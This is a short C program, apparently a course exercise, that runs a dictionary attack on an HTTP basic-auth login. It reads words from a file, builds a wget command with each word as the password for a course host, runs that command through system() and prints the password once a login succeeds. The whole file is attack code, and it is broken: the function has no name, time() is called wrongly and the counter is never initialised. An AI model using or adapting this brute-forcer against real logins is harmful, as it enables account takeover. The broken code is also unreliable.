


#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <ctype.h>

int ()
{
  int t1, t2, t;           
  int timeinsec, nofattempts;
  char url[100], url1[80];
  strcpy(url, "wget --http-user= --http-passwd="); 
  strcpy(url1, " http://sec-crack.cs.rmit.edu./SEC/2/ -o out.txt"); 
  char word[15], *chk;
  chk = "word";
  FILE *fp;
  int syst = 1;
  fp = fopen("words", "r");    
  t1 = time();
  while(chk != NULL)    
  {
    chk = fgets(word, 15, fp); 
    if (chk == NULL) exit(1);
    word [ strlen(word) - 1 ] = '\0'; 
    strcat(url, word);
    strcat(url, url1);
    nofattempts = nofattempts + 1;   
    printf("\n %s %d\n",word,nofattempts);
    if (strlen(word) == 3) 
    syst = system(url);
    if (syst == 0)  
    {
       t2 = time();
       t = t2 - t1;
       timeinsec = t/1000000000;
       printf("\n !!! here's the passowrd:- %s",word);
       printf("\n Total .of atempts: %d\n",nofattempts);
       printf("\n The total time_var taken: %d seconds", timeinsec);
       exit(1);
    }
    strcpy(url, "");
    strcpy(url, "wget --http-user= --http-passwd=");
  }
}
